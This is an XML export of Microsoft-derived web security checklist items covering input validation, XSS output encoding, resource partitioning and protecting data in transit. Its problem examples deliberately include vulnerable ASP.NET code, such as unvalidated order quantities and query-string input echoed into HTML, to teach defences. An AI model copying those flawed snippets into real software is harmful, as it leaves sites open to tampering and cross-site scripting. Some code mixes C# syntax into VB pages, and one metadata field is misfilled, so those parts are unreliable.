&lt;pre&gt;&amp;lt;%@ Page Language=&amp;quot;vb&amp;quot; %&amp;gt;&lt;br&gt; &lt;br&gt;&amp;lt;script runat=server&amp;gt;&lt;br&gt;public sub CheckID(source as Object, args as ServerValidateEventArgs)&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; args.IsValid = args.Value.substring(0, 1).tolower() &amp;lt;&amp;gt; &amp;quot;a&amp;quot;&lt;br&gt;end sub &lt;br&gt; &lt;br&gt;&amp;lt;/script&amp;gt;&lt;/pre&gt;
&lt;p&gt;To call this function, add a &lt;strong&gt;CustomValidator&lt;/strong&gt;, which is designed to call developer code to perform its check. Here is the declaration:&lt;/p&gt;
&lt;pre&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;asp:CustomValidator runat=server&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; controltovalidate=&amp;quot;txtName&amp;quot; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; errormessage=&amp;quot;ID is already in use.&amp;quot; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; OnServerValidate=&amp;quot;CheckID&amp;quot; /&amp;gt;&lt;/pre&gt;
&lt;p&gt;It is worth noting that this could have been done with the &lt;strong&gt;RegularExpression&lt;/strong&gt; validation control, but in this case it makes more sense to use custom validation since&amp;nbsp;a type of high-level validation that could conceivably be more complex then
 a simple pattern match is being defined (e.g., the validation rules might change based on application state).&amp;nbsp;&lt;/p&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;ol&gt;
&lt;/ol&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;Consider a very simple form for an online shopping cart. The cart component consists of two components:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;An HTML form that contains all of the fields that make up the order to be submitted for processing:&lt;/p&gt;
&lt;blockquote&gt;
&lt;blockquote&gt;
&lt;pre&gt;&amp;lt;html&amp;gt;&lt;br&gt;  &amp;lt;head&amp;gt;&lt;br&gt;    &amp;lt;title&amp;gt;Widget shopping cart&amp;lt;/title&amp;gt;&lt;br&gt;  &amp;lt;/head&amp;gt;&lt;br&gt;  &amp;lt;body&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;  &amp;lt;H1&amp;gt;welcome to the most boring shopping cart on the web!&amp;lt;/H1&amp;gt; &lt;/pre&gt;
&lt;pre&gt;    A widget's current price is $19.95 USD. Please use the following form to submit an order.&lt;/pre&gt;
&lt;pre&gt;    &amp;lt;form action=&amp;quot;process_order.aspx&amp;quot; method=&amp;quot;POST&amp;quot;&amp;gt;  &lt;br&gt;      &amp;lt;p&amp;gt;Please enter the number of widgets you would like to purchase:&amp;lt;/p&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;   quantity:&amp;lt;br/&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;  &amp;nbsp;&amp;lt;select name=&amp;quot;WidgetQuantity&amp;quot;&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;  &amp;nbsp; &amp;lt;option value=&amp;quot;1&amp;quot;&amp;gt;1&amp;lt;/option&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;   &amp;lt;option value=&amp;quot;2&amp;quot;&amp;gt;2&amp;lt;/option&amp;gt; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;   &amp;lt;option value=&amp;quot;3&amp;quot;&amp;gt;3&amp;lt;/option&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;   &amp;lt;option value=&amp;quot;4&amp;quot;&amp;gt;4&amp;lt;/option&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;  &amp;lt;/select&amp;gt;&lt;/pre&gt;
&lt;pre&gt;      ...&lt;br&gt;      &amp;lt;input type=&amp;quot;submit&amp;quot; value=&amp;quot;order&amp;quot;/&amp;gt;&lt;br&gt;    &amp;lt;/form&amp;gt;&lt;/pre&gt;
&lt;pre&gt;  &amp;lt;/body&amp;gt;&lt;br&gt;&amp;lt;/html&amp;gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;An ASP.NET page that processes the form submissions and performs the necessary steps to create the order.&lt;/p&gt;
&lt;blockquote&gt;
&lt;blockquote&gt;
&lt;pre&gt;int&amp;nbsp;dQuantity = Request(&amp;quot;WidgetQuantity&amp;quot;);&lt;br&gt;double dPrice = 19.95;&lt;/pre&gt;
&lt;pre&gt;double dCost = dQuantity * dPrice;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;p&gt;This server side page is problematic because it lacks validation to ensure the quantity field is correct.&amp;nbsp;The application&amp;nbsp;works fine in the case where a user plays by the rules and submits the form as it is shown because the&amp;nbsp;quantity field ensures that the
 range constraints for the order quantity are always valid.&amp;nbsp;However, if a clever user decides to construct their own form and submits a negative WidgetQuantity field, it causes a negative balance. Depending on what e-commerce system is used, this could result
 in a credit to the user's account. It also&amp;nbsp;might subtract the negative balance from the company's inventory, which would carry significant ramifications and costs&amp;nbsp;later on.&lt;/p&gt;
&lt;h1&gt;Solution Example&lt;/h1&gt;
&lt;p&gt;Consider the following ASP.NET page that processes the form submissions and performs the necessary steps to create an order:&lt;/p&gt;
&lt;pre&gt;&amp;lt;%@ Page Language=&amp;quot;vb&amp;quot; %&amp;gt;&lt;br&gt;&amp;lt;script runat=server&amp;gt;&lt;br&gt;public sub OnSubmit(source as Object, e as EventArgs)&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; if Page.IsValid then&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ' Now we can perform our transaction.&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; int dQuantity = Request(&amp;quot;WidgetQuantity&amp;quot;);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; double dPrice = 19.95;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; double dCost = dQuantity * dPrice;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; end if&lt;br&gt;end sub&lt;br&gt;&amp;lt;/script&amp;gt;&lt;br&gt;&amp;lt;html&amp;gt;&lt;br&gt;&amp;lt;head&amp;gt;&lt;br&gt;&amp;lt;title&amp;gt;Validation Sample&amp;lt;/title&amp;gt;&lt;br&gt;&amp;lt;/head&amp;gt;&lt;br&gt;&amp;lt;body&amp;gt;&lt;/pre&gt;
&lt;pre&gt;&amp;lt;form runat=server&amp;gt;&lt;br&gt;&amp;lt;asp:ValidationSummary runat=server headertext=&amp;quot;There were errors on the page:&amp;quot; /&amp;gt;&lt;/pre&gt;
&lt;pre&gt;&amp;lt;table&amp;gt;&lt;br&gt;&amp;nbsp; &amp;lt;tr&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;td&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;asp:RequiredFieldValidator runat=server &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; controltovalidate=&amp;quot;WidgetQuantity&amp;quot;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; errormessage=&amp;quot;WidgetQuantity is required.&amp;quot;&amp;gt;*&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;/asp:RequiredFieldValidator&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;/td&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;td&amp;gt;A widget's current price is $19.95 USD. Please use the following form to submit an order.&amp;lt;/td&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;td&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;select name=&amp;quot;WidgetQuantity&amp;quot;&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;option value=&amp;quot;1&amp;quot;&amp;gt;1&amp;lt;/option&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;option value=&amp;quot;2&amp;quot;&amp;gt;2&amp;lt;/option&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;option value=&amp;quot;3&amp;quot;&amp;gt;3&amp;lt;/option&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;option value=&amp;quot;4&amp;quot;&amp;gt;4&amp;lt;/option&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;/select&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;asp:RegularExpressionValidator runat=server display=dynamic&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; controltovalidate=&amp;quot;WidgetQuantity&amp;quot;&amp;nbsp; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; errormessage=&amp;quot;WidgetQuantity must be a non-zero, positive integer.&amp;quot; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; validationexpression=&amp;quot;[1-9]{1}[0-9]{0,7}&amp;quot; /&amp;gt;&lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;/td&amp;gt;&lt;br&gt;&amp;nbsp; &amp;lt;/tr&amp;gt;&lt;br&gt;...&lt;br&gt;&amp;lt;/table&amp;gt;&amp;lt;br&amp;gt;&lt;br&gt;&lt;/pre&gt;
&lt;pre&gt;&amp;lt;input type=submit runat=server id=cmdSubmit value=Submit onserverclick=OnSubmit&amp;gt;&lt;br&gt;&amp;lt;/form&amp;gt;&lt;br&gt;&amp;lt;/body&amp;gt;&lt;br&gt;&amp;lt;/html&amp;gt;&lt;/pre&gt;
&lt;p&gt;The ASP.NET Validator control provides client-side validation to reduce roundtrips to the server and improve user experience, but also provides server-side validation to&amp;nbsp;ensure that the widget quantity field is&amp;nbsp;a positive integer. It is also validated as
 a required field that must be provided before submitting the order.&lt;/p&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;For more information on user input validation in ASP.NET, see User Input Validation in ASP.NET in MSDN.&amp;nbsp;&lt;a href="http://msdn.microsoft.com/library/default.asp?url=/library/en-us/dnaspp/html/pdc_userinput.asp"&gt;http://msdn.microsoft.com/library/default.asp?url=/library/en-us/dnaspp/html/pdc_userinput.asp&lt;/a&gt;&amp;nbsp;
&lt;/li&gt;&lt;li&gt;For more information on validation server control syntax, see Validation Server Control Index in MSDN.&amp;nbsp;&lt;a href="http://msdn2.microsoft.com/en-us/library/e5a8xz39.aspx"&gt;http://msdn2.microsoft.com/en-us/library/e5a8xz39.aspx&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;For more information on general purpose code injection, see Code injection in Wikipedia.&amp;nbsp;&lt;a href="http://en.wikipedia.org/wiki/Code_injection"&gt;http://en.wikipedia.org/wiki/Code_injection&lt;/a&gt;&amp;nbsp;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:8ef52996-aec5-4274-aec1-85a3a313e0bc"&gt;Do Not Rely on Client-side Validation&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance. &lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>af830dac-244a-4887-88c9-5a30bdb2b422</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Unused administrative interfaces are disabled.</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Server Hardening</category>
    <phase>Deployment</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;Web Application&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Check to ensure that unused administrative interfaces are disabled when&amp;nbsp;configuring your network switches for security.&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>afda6b09-c1bc-425a-a59a-f4ffe7c085b9</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Application is Partitioned into Public and Private Domains</title>
    <topic>Security</topic>
    <technology>Java</technology>
    <category>Authentication</category>
    <phase>Deployment</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Ensure that your application clearly defines the boundaries between its protected and unprotected resources.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Defining a boundary between public and restricted content helps establish the check points that will allow access to the restricted content.&lt;/p&gt;
&lt;h1&gt;How to Check&lt;/h1&gt;
Follow these steps to ensure your application is partitioned into public and protected (restricted) domains:
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Enumerate all web accessible resources. &lt;/strong&gt;Identify the protected resources from the public resources. Common protected resources include but are not limited to:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Resources that require authentication &lt;/li&gt;&lt;li&gt;Critical application resources &lt;/li&gt;&lt;li&gt;Sensitive/confidential data&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Ensure that protected resources have the appropriate access controls. &lt;/strong&gt;
Use the &lt;a href="?#ruledisplay:152B3F11-E1F6-4885-B1CA-5FBF866E9FF2"&gt;Role-based Security Checks are Performed&lt;/a&gt; checklist to determine if all protected resources have the appropriate access controls assigned to them.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Check if there is separation on disk between public and protected resources.
&lt;/strong&gt;Examine the local filesystem structure. Check if a protected resource is located inside a public directory and vice versa.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Verify the local system permissions for all resources. &lt;/strong&gt;For each resource, check that the local system permissions are set accordingly. If the resource is public, verify that anonymous users can access it. If the resource is protected, verify
 that only authorized users can access it.&lt;/p&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;MyApp is a financial tool that generates reports based on sensitive data. It allows the user to upload the financial data and download the report. Since the application is small, all of its content is located within the same directory. The access control
 is enforced by the web application through checking the required permissions before a given call is executed.&lt;/p&gt;
&lt;p&gt;Since both data and code is within the same directory, it may be possible for an attacker to gain access to the raw financial data.&lt;/p&gt;
&lt;h1&gt;Related Guideline&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:6543475A-082B-4E98-8446-F2AFF2EF0553"&gt;Guideline: Partition Application Between Public and Private Domains (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;/ul&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>afda96a3-d516-4acd-904e-54c974d88932</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>All Output Data is Encoded</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Input and Data Validation</category>
    <phase>Design</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>1</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Ensure that input is not echoed back to the user without first validating and/or encoding the data. Data which can be modified by a user must be treated as untrusted data.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Echoing input directly back to the user makes your application susceptible to some code injection attacks, such as the
&lt;a href="?#ruledisplay:BC10DCE2-CA48-44BF-8BF6-FEFBE8DCCB7E"&gt;Cross Site Scripting Attack&lt;/a&gt;. What constitutes malicious input varies widely depending on the system in question. On the web, it normally means some kind of JavaScript.&lt;/p&gt;
&lt;h1&gt;How to Check&lt;/h1&gt;
&lt;p&gt;Use the following steps to ensure that input which can be modified by a user is properly validated and encoded before being echoed back to the user:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Identify all sources of user input.&lt;/strong&gt; At design time and again at the code review stage during development, determine all the possible tainted inputs to the application. Determine the intended characteristics of each input (length, format,
 etc.) and create validators for them. The following list includes some common input sources:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Form Fields &lt;/li&gt;&lt;li&gt;Query strings &lt;/li&gt;&lt;li&gt;Databases and data access methods &lt;/li&gt;&lt;li&gt;Cookie collection &lt;/li&gt;&lt;li&gt;Session and application variables&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Identify all output that includes user input.&lt;/strong&gt; At design time and again at the code review stage during development, trace all inputs to the system though and determine all of the places where they may be output. In each case, identify the
 context in which the output occurs.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Ensure all user-controllable data is properly encoded before being sent as output.&lt;/strong&gt; In each location where data is output, it must be encoded according the the context of the output.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Do not rely on the &lt;strong&gt;Server.HtmlEncode&lt;/strong&gt; function to protect your application against cross-site scripting attacks. Instead use the Microsoft Anti-Cross Site Scripting Library available here -
&lt;a href="http://www.microsoft.com/downloads/details.aspx?familyid=efb9c819-53ff-4f82-bfaf-e11625130c25&amp;amp;displaylang=en"&gt;
http://www.microsoft.com/downloads/details.aspx?familyid=efb9c819-53ff-4f82-bfaf-e11625130c25&amp;amp;displaylang=en&lt;/a&gt;.
&lt;/li&gt;&lt;li&gt;Do not attempt to use a character block list; when taking into account Unicode characters, etc., along with new emerging attack forms, block lists are guaranteed to be ineffective.
&lt;/li&gt;&lt;li&gt;Ensure that allow list encoding is performed so that all non-alphanumeric characters are encoded instead of certain specific characters like '&amp;lt;', '&amp;gt;, etc.
&lt;/li&gt;&lt;li&gt;Encoding must be selected appropriately based upon how the output is returned to the client- either as HTML content or in a URL. Verify the context in which the output is used and ensure it is properly encoded.
&lt;/li&gt;&lt;li&gt;If you are using the Microsoft Anti-Cross Site Scripting Library, ensure that the
&lt;strong&gt;Microsoft.Security.ApplicationAntiXSSLibrary.HtmlEncode&lt;/strong&gt; method is being used to encode HTML tags and their attributes. Similarly, in case your application constructs certain URLs from input data or data from a shared database, ensure that the
&lt;strong&gt;Microsoft.Security.ApplicationAntiXSSLibrary.UrlEncode&lt;/strong&gt; method is being used to make them safe.
&lt;/li&gt;&lt;li&gt;Make sure that you encode data at the last possible opportunity before the data is returned to the client. If you encode any earlier than this, you may not know the exact context that the data will be used in, and hence the format you need to encode into.
 Also, early encoding of some data can result in double encoding problems.&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;p&gt;If data is being written out into an HTML context, the following code will ensure that only known safe characters get through and guard against all possible XSS attacks. It will increase the size of the resulting HTML and does require more processing overhead,
 but it is definitely safe:&lt;/p&gt;
&lt;pre&gt;public static string HtmlEncode(string x){&lt;br&gt;  if (x == null)&lt;br&gt;  {&lt;br&gt;      return x;&lt;br&gt;  }&lt;br&gt;  return Regex.Replace(x, &amp;quot;[^a-zA-Z0-9]&amp;#43;&amp;quot;, new MatchEvaluator(WebUtility.EncodeMatch));&lt;br&gt;}&lt;/pre&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;As it uses user input directly from the query string, the following ASP.NET code is vulnerable:&lt;/p&gt;
&lt;pre&gt;&amp;lt;img id='img&amp;lt;%=Server.HtmlEncode(Request.QueryString[&amp;quot;userId&amp;quot;]) %&amp;gt;' src='/image.gif' /&amp;gt;&lt;/pre&gt;
&lt;p&gt;Since this page does not encode the output which depends upon the user supplied query string parameter
&lt;strong&gt;userID&lt;/strong&gt;, malicious user input will lead to cross site scripting attacks.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; While simple XSS attacks will not work for this webpage as ASP.NET enables request validation by default, many more complex attack will be successful. Read more about this problem here:
&lt;a href="?#ruledisplay:DD60FFDF-904D-45A8-8278-F3E8CEBA911F"&gt;Do Not Rely on Request Validation&lt;/a&gt;.&lt;/p&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://msdn2.microsoft.com/en-us/library/ms998274.aspx"&gt;How To: Prevent Cross-Site Scripting in ASP.NET&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;Download the Microsoft Anti-Cross Site Scripting Library here &lt;a href="http://www.microsoft.com/downloads/details.aspx?familyid=efb9c819-53ff-4f82-bfaf-e11625130c25&amp;amp;displaylang=en"&gt;
http://www.microsoft.com/downloads/details.aspx?familyid=efb9c819-53ff-4f82-bfaf-e11625130c25&amp;amp;displaylang=en&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Related Guideline&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:1AB38C50-F31D-4CD8-89B1-CE397E6895E8"&gt;Guideline: Encode All Output Data (ASP.NET)&lt;/a&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance. &lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>b01640d3-706c-480d-9cce-419d32d97bed</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Sensitive Data is Protected Over the Network</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Sensitive Data</category>
    <phase>Implementation</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Ensure that encryption is used to protect sensitive data that is transmitted over the network.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;When data is sent over the network, it typically passes through several intermediate relays on its way towards some final destination. Using a safe protocol to transmit information is important because it adds protection against a
&lt;a href="?#ruledisplay:5F929DD7-759F-4412-A9B1-08567CDE9035"&gt;Network Eavesdropping Attack&lt;/a&gt; or
&lt;a href="?#ruledisplay:48BB4D3A-9295-4263-B3E7-090E483DEC5D"&gt;Man in the Middle Attack&lt;/a&gt; during transport.&lt;/p&gt;
&lt;h1&gt;How to Check&lt;/h1&gt;
&lt;p&gt;When an application transmits sensitive data over the network, it is necessary to ensure that it is encrypted to protect the data from being stolen or modified in transit. To ensure this, follow the steps outlined below:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Identify sensitive information.&lt;/strong&gt; Sensitive data is any information that is kept secret and should be disclosed only to authorized parties. Common examples of sensitive data include, but are not limited to, names of customers, government issued
 ID numbers, credit card and other financial information, passwords, and private keys. Some industries, such as health care and banking, have regulatory standards that define sensitive information. Use regulatory requirements, as they apply to your application,
 to identify sensitive data. Sensitive data can be defined as follows:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Information that either contains personally identifiable information or can be used to derive personally identifiable information that should not be shared with others.
&lt;/li&gt;&lt;li&gt;Information that a user provides that they would not want shared with other users of the application.
&lt;/li&gt;&lt;li&gt;Information that comes from an external trusted source that is not designed to be shared with users&lt;/li&gt;&lt;/ul&gt;
&lt;strong&gt;&lt;/strong&gt;&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Verify that sensitive data is securely transmitted.&lt;/strong&gt; Ensure that your application transmits sensitive data in a secured fashion. Check if your application uses the following approaches:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Encrypting the communication links.&lt;/strong&gt; Using the &lt;a href="?#ruledisplay:F4F69A8F-F164-4821-89D3-B49571922848"&gt;
Communication Links are Encrypted&lt;/a&gt; checklist, check if your application's communication links are properly secured.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Encrypting application data.&lt;/strong&gt; If your application encrypts its application data, check if your application securely transforms its application data before transmitting it over the network:
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Hashing. &lt;/strong&gt;Hashing is a one-way mechanism for storing sensitive data in a non-retrievable way. If your application uses hashing as means for storing sensitive data, verify that the following pieces are in place:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Salt&lt;/strong&gt;: Check if your application generates its salt using the
&lt;strong&gt;RNGCryptoServiceProvider&lt;/strong&gt; class. &lt;/li&gt;&lt;li&gt;&lt;strong&gt;Function&lt;/strong&gt;: Check if your application uses SHA-256, SHA-384, or SHA-512 as its hash function.
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Invocation&lt;/strong&gt;: Check if your application invokes the &lt;strong&gt;HMAC.ComputeHash&lt;/strong&gt; method to perform the hashing procedure.
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Clean-up&lt;/strong&gt;: Check if your application securely cleans-up all instances of the sensitive data after the hashing procedure has been completed. Consult the
&lt;a href="?#ruledisplay:026A38B1-C59E-4BB7-952F-4EB7206E3717"&gt;Sensitive Data is Cleared from Memory when No Longer Used&lt;/a&gt; checklist for more details.&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;li&gt;
